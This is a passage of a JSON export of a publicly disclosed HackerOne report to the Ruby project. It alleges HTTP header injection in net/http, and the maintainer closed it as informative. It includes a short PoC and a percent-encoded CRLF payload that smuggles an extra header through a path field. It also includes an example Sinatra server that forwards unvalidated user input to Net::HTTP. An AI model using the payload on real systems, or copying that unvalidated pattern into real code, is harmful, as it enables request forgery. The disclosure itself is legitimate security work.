            "markdown_message": "<p>I&#39;ve closed as informative, and I&#39;ll allow public disclosure.</p>\n", 
            "type": "Activities::BugInformative", 
            "id": 1033554, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T08:20:42.949Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T08:20:42.949Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1033558, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T08:27:25.846Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T08:27:25.846Z", 
            "actor": {
                "username": "rootredrain", 
                "url": "/rootredrain", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/636/ce69f97329a91d9ee85ec2a82758aa0eb74d500c_medium.jpg?1466586493"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "The HTTP scheme handler accepts percent-encoded values as part of the URL.\n\nThe generic_request.rb allows unsafe characters, it dosen't have any safe filtration, attackers can cause actual security threat. so we consider it is a vulnerability", 
            "markdown_message": "<p>The HTTP scheme handler accepts percent-encoded values as part of the URL.</p>\n\n<p>The generic_request.rb allows unsafe characters, it dosen&#39;t have any safe filtration, attackers can cause actual security threat. so we consider it is a vulnerability</p>\n", 
            "type": "Activities::HackerRequestedMediation", 
            "id": 1033562, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-27T02:02:52.810Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-27T02:02:52.810Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 1507062, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "rootredrain", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/rootredrain", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/070/636/9686bbf7a2a951979d025f212f2b4a67c769823f_small.jpg?1466586493"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 53, 
        "name": "Open Redirect"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-02-27T02:02:52.833Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/146416", 
    "created_at": "2016-06-22T08:46:41.429Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,</p>\n\n<p>I would like to report a HTTP Header injection vulnerability in &#39;net/http&#39; that allows attackers to inject arbitrary headers in request even create a new evil request.</p>\n\n<h3 id=\"poc\">PoC</h3>\n<pre class=\"highlight plaintext\"><code>require &#39;net/http&#39;\nhttp = Net::HTTP.new(&#39;192.168.30.214&#39;,&#39;80&#39;)\nres = http.get(&quot;/r.php HTTP/1.1\\r\\nx-injection: memeda&quot;)\n\n</code></pre>\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"222333.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/919/2c568749f0b375686b0b23366eda8989332f1114/222333.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=85100bac936a79a8f57b89a45c706ae18b2625848769d6b70b197159df78d74e\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/919/2c568749f0b375686b0b23366eda8989332f1114/222333.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=85100bac936a79a8f57b89a45c706ae18b2625848769d6b70b197159df78d74e\" class=\"markdown-inline-image\"></a></p>\n\n<h3 id=\"example\">Example</h3>\n\n<p>Server Code:</p>\n<pre class=\"highlight ruby\"><code><span class=\"c1\">#!/usr/bin/env ruby</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;sinatra&#39;</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;uri&#39;</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;net/http&#39;</span>\n\n<span class=\"n\">get</span> <span class=\"s1\">&#39;/&#39;</span> <span class=\"k\">do</span>\n  <span class=\"s1\">&#39;hello world&#39;</span>\n<span class=\"k\">end</span>\n\n<span class=\"n\">post</span> <span class=\"s1\">&#39;/&#39;</span> <span class=\"k\">do</span>\n  <span class=\"n\">ip</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:ip</span><span class=\"p\">]</span>\n  <span class=\"n\">port</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:port</span><span class=\"p\">]</span>\n  <span class=\"n\">path</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:path</span><span class=\"p\">]</span>\n\n  <span class=\"c1\"># do what you want</span>\n  <span class=\"n\">http</span> <span class=\"o\">=</span> <span class=\"no\">Net</span><span class=\"o\">::</span><span class=\"no\">HTTP</span><span class=\"p\">.</span><span class=\"nf\">new</span> <span class=\"n\">ip</span><span class=\"p\">,</span> <span class=\"n\">port</span><span class=\"p\">.</span><span class=\"nf\">to_i</span>\n  <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">http</span><span class=\"p\">.</span><span class=\"nf\">get</span> <span class=\"n\">path</span>\n\n  <span class=\"n\">res</span><span class=\"p\">.</span><span class=\"nf\">body</span>\n\n<span class=\"k\">end</span>\n</code></pre>\n<p>post data:</p>\n<pre class=\"highlight plaintext\"><code>ip=192.168.30.214&amp;port=80&amp;path=/r.php%20HTTP/1.1%0d%0ax-injection: memeda\n</code></pre>\n<p>print_r all HTTP Headers\uff1a</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"123123.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/918/7b7d13febcf1981da6154a3813ea2fb9fa631290/123123.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=0c5cf409d1bebb50e2d77bd7a6c47293840fa90bf73524cc8b857bf937c93e9b\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/918/7b7d13febcf1981da6154a3813ea2fb9fa631290/123123.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=0c5cf409d1bebb50e2d77bd7a6c47293840fa90bf73524cc8b857bf937c93e9b\" class=\"markdown-inline-image\"></a></p>\n\n<h3 id=\"create-an-evil-request\">Create an evil request</h3>\n\n<p>post data:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"4444.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/920/51dc9ad18ecf75f937229311a374f32cd08a11bc/4444.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=0143c162336d5eff4937dd7dd5ba65068c3e780de577c7cdc7722c34fa008b66\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/920/51dc9ad18ecf75f937229311a374f32cd08a11bc/4444.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=0143c162336d5eff4937dd7dd5ba65068c3e780de577c7cdc7722c34fa008b66\" class=\"markdown-inline-image\"></a></p>\n\n<p>server log:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"5555.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/921/6cee949a6cfe9a176c7fafcb1904c3978a1cf6d0/5555.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=ef6a5c49c7c7cd8670dab63017e8af378f73f49440584a3be7e641e06e07b699\" data-attachment-type=\"image/jpeg\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/921/6cee949a6cfe9a176c7fafcb1904c3978a1cf6d0/5555.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224301Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=ef6a5c49c7c7cd8670dab63017e8af378f73f49440584a3be7e641e06e07b699\" class=\"markdown-inline-image\"></a></p>\n\n<h3 id=\"suggestion\">Suggestion:</h3>\n\n<p>Should validate URI legality before send request</p>\n\n<p>btw\uff0c</p>\n\n<p>Cloud I have a CVEID with this vulnerability? reported by <a href=\"/redrain\">@redrain</a>(<a title=\"rootredrain@gmail.com\" href=\"mailto:rootredrain@gmail.com\" rel=\"nofollow noopener noreferrer\">rootredrain@gmail.com</a>) and <a href=\"/ztz\">@ztz</a>(<a title=\"ztz5651483@gmail.com\" href=\"mailto:ztz5651483@gmail.com\" rel=\"nofollow noopener noreferrer\">ztz5651483@gmail.com</a>) </p>\n", 
    "vulnerability_information": "Hi,\n\nI would like to report a HTTP Header injection vulnerability in 'net/http' that allows attackers to inject arbitrary headers in request even create a new evil request.\n\n###PoC\n\n```\nrequire 'net/http'\nhttp = Net::HTTP.new('192.168.30.214','80')\nres = http.get(\"/r.php HTTP/1.1\\r\\nx-injection: memeda\")\n\n```\n{F100919}\n\n###Example\nServer Code:\n```\n#!/usr/bin/env ruby\nrequire 'sinatra'\nrequire 'uri'\nrequire 'net/http'\n\nget '/' do\n  'hello world'\nend\n\npost '/' do\n  ip = params[:ip]\n  port = params[:port]\n  path = params[:path]\n\n  # do what you want\n  http = Net::HTTP.new ip, port.to_i\n  res = http.get path\n\n  res.body\n\nend\n```\npost data:\n\n```\nip=192.168.30.214&port=80&path=/r.php%20HTTP/1.1%0d%0ax-injection: memeda\n```\n\nprint_r all HTTP Headers\uff1a\n\n{F100918}\n\n\n###Create an evil request\n\npost data:\n\n{F100920}\n\nserver log:\n{F100921}\n\n\n###Suggestion:\n\nShould validate URI legality before send request\n\nbtw\uff0c\n\nCloud I have a CVEID with this vulnerability? reported by @redrain(rootredrain@gmail.com) and @ztz(ztz5651483@gmail.com) ", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.ruby-lang.org", 
            "about": "A Programmer's Best Friend", 
            "twitter_handle": "", 
            "name": "Ruby"
        }, 
        "handle": "ruby", 
        "url": "https://hackerone.com/ruby", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/007/724/36e273f967b252ae8b4051d09ffc08f7de16d7d5_small.png?1449271894", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/007/724/0c1556227f51c9b2b13ada11ccd2fb02cc9fa257_medium.png?1449271894"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 7724, 
        "default_currency": "usd"
    }, 
    "is_published": false
}